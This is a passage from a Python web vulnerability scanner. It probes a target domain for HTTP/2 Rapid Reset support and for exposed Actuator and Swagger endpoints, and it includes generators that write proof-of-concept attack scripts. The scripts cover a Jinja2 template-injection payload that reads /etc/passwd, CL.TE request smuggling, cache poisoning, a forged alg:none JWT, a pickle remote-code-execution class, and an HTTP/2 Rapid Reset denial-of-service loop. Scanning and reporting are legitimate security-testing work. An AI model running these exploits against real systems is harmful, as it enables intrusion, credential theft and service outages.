                            "Upgrade frameworks with known path normalization CVEs "
                            "(Spring Boot: CVE-2022-22965, Nginx, Apache path traversal)."
                        ),
                    )
                    return

    # ──────────────────────────────────────────────────────────────────────
    # 14. HTTP/2 Rapid Reset (CVE-2023-44487)
    # ──────────────────────────────────────────────────────────────────────

    def _check_http2_rapid_reset(self):
        """
        Fingerprint: check if the server supports HTTP/2 via ALPN.
        Full Rapid Reset exploitation requires h2 frames; here we report
        the attack surface (server supports h2 without rate limiting).
        """
        try:
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            ctx.set_alpn_protocols(["h2", "http/1.1"])

            with socket.create_connection((self.domain, 443), timeout=10) as sock:
                with ctx.wrap_socket(sock, server_hostname=self.domain) as tls:
                    negotiated = tls.selected_alpn_protocol()
                    if negotiated == "h2":
                        # Check server/version headers via regular HTTPS
                        r = _request_safe(self.session, "GET", self.base_url, 10)
                        server_hdr = r.headers.get("server", "") if r else ""
                        self._add_finding(
                            vuln_type="HTTP/2 Rapid Reset (CVE-2023-44487)",
                            severity="HIGH",
                            url=self.base_url,
                            description=(
                                "Server supports HTTP/2 (h2 negotiated via ALPN). "
                                "CVE-2023-44487 (HTTP/2 Rapid Reset) allows an attacker "
                                "to send a stream of RST_STREAM frames to exhaust server "
                                "resources and cause a Denial of Service. "
                                f"Server: {server_hdr}"
                            ),
                            evidence=f"ALPN negotiated: h2 | Server: {server_hdr}",
                            poc=self._poc_http2_rapid_reset(),
                            remediation=(
                                "Update to a patched version: "
                                "nginx >= 1.25.3, Apache httpd >= 2.4.58, "
                                "nghttp2 >= 1.57.0, Go >= 1.21.3. "
                                "Enable HTTP/2 stream rate limiting. "
                                "Set max concurrent streams to a low value (e.g., 100)."
                            ),
                        )
        except Exception:
            pass

    # ──────────────────────────────────────────────────────────────────────
    # 15. Open API / Actuator Exposure
    # ──────────────────────────────────────────────────────────────────────

    def _check_api_exposure(self):
        api_paths = [
            ("/actuator",             "Spring Boot Actuator"),
            ("/actuator/env",         "Spring Boot Actuator /env"),
            ("/actuator/heapdump",    "Spring Boot Heap Dump"),
            ("/actuator/threaddump",  "Spring Boot Thread Dump"),
            ("/actuator/beans",       "Spring Boot Beans"),
            ("/swagger-ui.html",      "Swagger UI"),
            ("/swagger-ui/index.html","Swagger UI"),
            ("/openapi.json",         "OpenAPI Spec"),
            ("/api-docs",             "API Docs"),
            ("/v2/api-docs",          "Swagger v2"),
            ("/v3/api-docs",          "OpenAPI v3"),
        ]
        for path, name in api_paths:
            url = self.base_url + path
            r   = _request_safe(self.session, "GET", url, self.timeout)
            if r and r.status_code == 200:
                # Confirm it's real content
                indicators = ["swagger", "openapi", "actuator",
                               "beans", "environment", "heap"]
                if any(ind in r.text.lower() for ind in indicators):
                    severity = "CRITICAL" if "heap" in path or "env" in path else "HIGH"
                    self._add_finding(
                        vuln_type=f"Exposed {name}",
                        severity=severity,
                        url=url,
                        description=(
                            f"'{name}' is publicly accessible at {path}. "
                            "This exposes internal application details, environment "
                            "variables (potentially including secrets/credentials), "
                            "API schema, and management endpoints."
                        ),
                        evidence=f"HTTP 200 at {url} | Content snippet: {r.text[:150]}",
                        poc=self._poc_api_exposure(url, name),
                        remediation=(
                            f"Restrict access to {path} by IP or authentication. "
                            "In Spring Boot: set management.endpoints.web.exposure.include"
                            "=health,info only. "
                            "Remove Swagger UI in production or add authentication."
                        ),
                    )

    # ──────────────────────────────────────────────────────────────────────
    # Finding storage helper
    # ──────────────────────────────────────────────────────────────────────

    def _add_finding(self, vuln_type: str, severity: str, url: str,
                     description: str, evidence: str, poc: str,
                     remediation: str, cve_id: str = ""):
        color = self.SEVERITY_COLORS.get(severity, "[white]")
        console.print(
            f"\n  {color}[{severity}][/] 🔴 {vuln_type}\n"
            f"  [white]🔗 URL:[/white] {url}\n"
            f"  [dim]{description[:120]}[/dim]"
        )
        self.findings.append({
            "type":        vuln_type,
            "severity":    severity,
            "url":         url,
            "description": description,
            "evidence":    evidence,
            "poc":         poc,
            "remediation": remediation,
            "cve_id":      cve_id,
            "timestamp":   datetime.utcnow().isoformat(),
        })

    # ──────────────────────────────────────────────────────────────────────
    # Summary printer
    # ──────────────────────────────────────────────────────────────────────

    def _print_summary(self):
        total = len(self.findings)
        counts = {}
        for f in self.findings:
            counts[f["severity"]] = counts.get(f["severity"], 0) + 1

        table = Table(title="Zero-Day Scan Summary", border_style="cyan")
        table.add_column("Severity",  style="bold")
        table.add_column("Count",     justify="right")
        for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
            if sev in counts:
                colors = {"CRITICAL": "red", "HIGH": "orange1",
                          "MEDIUM": "yellow", "LOW": "cyan", "INFO": "green"}
                table.add_row(
                    f"[{colors[sev]}]{sev}[/{colors[sev]}]",
                    str(counts[sev])
                )
        table.add_row("[bold white]TOTAL[/bold white]", f"[bold]{total}[/bold]")
        console.print("\n", table)

    # ──────────────────────────────────────────────────────────────────────
    # POC Generators
    # ──────────────────────────────────────────────────────────────────────

    @staticmethod
    def _poc_tech_disclosure(header_val: str) -> str:
        return f'''# POC: Technology Disclosure via X-Powered-By
import requests

r = requests.get("https://TARGET", verify=False)
print("X-Powered-By:", r.headers.get("x-powered-by"))
# Detected: {header_val}
'''

    @staticmethod
    def _poc_cve(cve_id: str, tech: str, version: str, refs: list) -> str:
        ref = refs[0] if refs else f"https://nvd.nist.gov/vuln/detail/{cve_id}"
        return f'''# POC Reference: {cve_id}
# Technology: {tech} {version}
# Details: {ref}

"""
This CVE affects {tech} version {version}.
Check the reference above for a working exploit / PoC.
Automated exploitation of real CVEs requires
version-specific payloads — see PoC DB:
  https://www.exploit-db.com/search?cve={cve_id.replace("CVE-", "")}
  https://github.com/search?q={cve_id}
"""
'''

    @staticmethod
    def _poc_sensitive_file(url: str) -> str:
        return f'''# POC: Sensitive File Exposure
import requests

r = requests.get("{url}", verify=False)
print(f"Status: {{r.status_code}}")
print(f"Content (first 500 chars):\\n{{r.text[:500]}}")
'''

    @staticmethod
    def _poc_ssti(url: str, param: str, payload: str, engine: str) -> str:
        return f'''# POC: Server-Side Template Injection ({engine})
import requests, urllib.parse

# Step 1: Verify math evaluation
payload = "{payload}"
test_url = "{url}"
r = requests.get(test_url, verify=False)
print("Math eval result in body:", "49" in r.text)

# Step 2: Extract /etc/passwd (Jinja2)
rce_payload = "{{{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}}}"
exploit_url = f"https://TARGET/?{param}={{urllib.parse.quote(rce_payload)}}"
r2 = requests.get(exploit_url, verify=False)
print("RCE result:", r2.text[:300])
'''

    @staticmethod
    def _poc_smuggling(host: str) -> str:
        return f'''# POC: HTTP Request Smuggling (CL.TE)
import socket, ssl, time

payload = (
    "POST / HTTP/1.1\\r\\n"
    "Host: {host}\\r\\n"
    "Content-Type: application/x-www-form-urlencoded\\r\\n"
    "Content-Length: 6\\r\\n"
    "Transfer-Encoding: chunked\\r\\n"
    "\\r\\n"
    "0\\r\\n"
    "\\r\\n"
    "G"  # poisons the next request
)

ctx = ssl.create_default_context()
ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
with socket.create_connection(("{host}", 443), 10) as s:
    with ctx.wrap_socket(s, server_hostname="{host}") as tls:
        tls.sendall(payload.encode())
        resp = tls.recv(4096)
        print(resp.decode(errors="ignore"))
'''

    @staticmethod
    def _poc_cache_poisoning(header: str, value: str) -> str:
        return f'''# POC: Web Cache Poisoning via {header}
import requests

# Step 1: Poison the cache
r = requests.get(
    "https://TARGET/",
    headers={{"{header}": "{value}"}},
    verify=False
)
print("Response contains injected value:", "{value}" in r.text)

# Step 2: Verify cached response (send without the header)
r2 = requests.get("https://TARGET/", verify=False)
print("Cached poisoned response:", "{value}" in r2.text)
'''

    @staticmethod
    def _poc_host_header(evil_host: str) -> str:
        return f'''# POC: Host Header Injection
import requests

r = requests.get(
    "https://TARGET/",
    headers={{"Host": "{evil_host}"}},
    verify=False,
    allow_redirects=False
)
print("Status:", r.status_code)
print("Location:", r.headers.get("location", ""))
print("Body snippet:", r.text[:300])
# Evil host reflected → exploit password-reset poisoning
'''

    @staticmethod
    def _poc_crlf(url: str, payload: str) -> str:
        return f'''# POC: CRLF Injection
import requests

r = requests.get("{url}", verify=False, allow_redirects=False)
print("Injected Set-Cookie in response headers:")
print(r.headers.get("set-cookie", ""))
# Payload used: {payload}
'''

    @staticmethod
    def _poc_jwt_none(url: str, token: str) -> str:
        return f'''# POC: JWT Algorithm Confusion (alg:none)
import requests

# Forged admin token (alg:none, no signature)
forged_token = "{token}"

r = requests.get(
    "{url}",
    headers={{"Authorization": f"Bearer {{forged_token}}"}},
    verify=False
)
print("Status:", r.status_code)
print("Response:", r.text[:300])
# If 200 → server does NOT verify JWT signature!
'''

    @staticmethod
    def _poc_graphql(url: str, introspection: bool) -> str:
        query = "__schema{types{name fields{name}}}" if introspection else "__typename"
        return f'''# POC: GraphQL {"Introspection" if introspection else "Exposure"}
import requests, json

r = requests.post(
    "{url}",
    json={{"query": "{{{query}}}"}},
    headers={{"Content-Type": "application/json"}},
    verify=False
)
print(json.dumps(r.json(), indent=2))
'''

    @staticmethod
    def _poc_prototype_pollution(url: str, payload: str) -> str:
        return f'''# POC: Prototype Pollution (Node.js)
import requests

r = requests.post(
    "{url}",
    data=\'\'\'{payload}\'\'\',
    headers={{"Content-Type": "application/json"}},
    verify=False
)
print("Status:", r.status_code)
print("Response:", r.text[:300])
# If canary value is reflected → Object.prototype is polluted
'''

    @staticmethod
    def _poc_deserialization(url: str, lang: str) -> str:
        return f'''# POC: Insecure Deserialization ({lang})
import requests

# Sending {lang} magic bytes triggers deserialization
# Use ysoserial (Java) or pickle bomb (Python) for full RCE:

# Java: java -jar ysoserial.jar CommonsCollections1 "whoami" > payload.bin
# Python pickle:
import pickle, os
class RCE:
    def __reduce__(self):
        return (os.system, ("id",))
payload = pickle.dumps(RCE())

r = requests.post(
    "{url}",
    data=payload,
    headers={{"Content-Type": "application/octet-stream"}},
    verify=False
)
print("Status:", r.status_code)
print("Response:", r.text[:300])
'''

    @staticmethod
    def _poc_path_normalization(url: str, path: str) -> str:
        return f'''# POC: Path Normalization / Access Control Bypass
import requests

# Direct access (should be blocked)
r1 = requests.get("https://TARGET/admin", verify=False, allow_redirects=False)
print("Direct /admin:", r1.status_code)

# Bypass via path normalization
r2 = requests.get("{url}", verify=False, allow_redirects=True)
print("Bypass path ({path}):", r2.status_code)
print("Admin content:", "admin" in r2.text.lower())
'''

    @staticmethod
    def _poc_http2_rapid_reset() -> str:
        return '''# POC: HTTP/2 Rapid Reset (CVE-2023-44487)
# Requires h2 library: pip install h2 hyper

"""
Conceptual exploit — sends many HEADERS + RST_STREAM frames.
For a full PoC see: https://github.com/secengjeff/rapidresetclient
"""

import h2.connection, h2.config, h2.events
import socket, ssl, time

TARGET = "TARGET_DOMAIN"
NUM_STREAMS = 200   # Adjust — high values cause DoS

ctx = ssl.create_default_context()
ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
ctx.set_alpn_protocols(["h2"])

config = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
conn   = h2.connection.H2Connection(config=config)

with socket.create_connection((TARGET, 443), 10) as sock:
    with ctx.wrap_socket(sock, server_hostname=TARGET) as tls:
        conn.initiate_connection()
        tls.sendall(conn.data_to_send(65535))

        for i in range(NUM_STREAMS):
            stream_id = conn.get_next_available_stream_id()
            conn.send_headers(stream_id, [
                (":method",    "GET"),
                (":path",      "/"),
                (":scheme",    "https"),
                (":authority", TARGET),
            ])
            conn.reset_stream(stream_id)  # RST_STREAM immediately
            tls.sendall(conn.data_to_send(65535))

        print(f"[+] Sent {NUM_STREAMS} HEADERS+RST_STREAM pairs — CVE-2023-44487")
'''

    @staticmethod
    def _poc_api_exposure(url: str, name: str) -> str:
        return f'''# POC: Exposed {name}
import requests, json

r = requests.get("{url}", verify=False)
print("Status:", r.status_code)
try:
    data = r.json()
    print(json.dumps(data, indent=2)[:1000])
except Exception:
    print(r.text[:500])

# Sensitive data to look for in /actuator/env:
# - DB passwords, API keys, JWT secrets, cloud credentials
'''


# ─────────────────────────────────────────────────────────────────────────────
# CLI entry-point (standalone usage)
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import argparse, sys
    ap = argparse.ArgumentParser(description="Zero-Day Scanner (standalone)")
    ap.add_argument("-d", "--domain",  required=True, help="Target domain")
    ap.add_argument("--threads",       type=int, default=10)
    ap.add_argument("--timeout",       type=int, default=20)
    ap.add_argument("--nvd-key",       default="", help="NVD API key (optional)")
    args = ap.parse_args()

    scanner  = ZeroDayScanner(args.domain, args.threads, args.timeout,
                               nvd_api_key=args.nvd_key)
    findings = scanner.scan()

    print(f"\n[+] Total findings: {len(findings)}")
    for f in findings:
        print(f"\n{'='*60}")
        print(f"Type      : {f['type']}")
        print(f"Severity  : {f['severity']}")
        print(f"URL       : {f['url']}")
        print(f"Evidence  : {f['evidence']}")
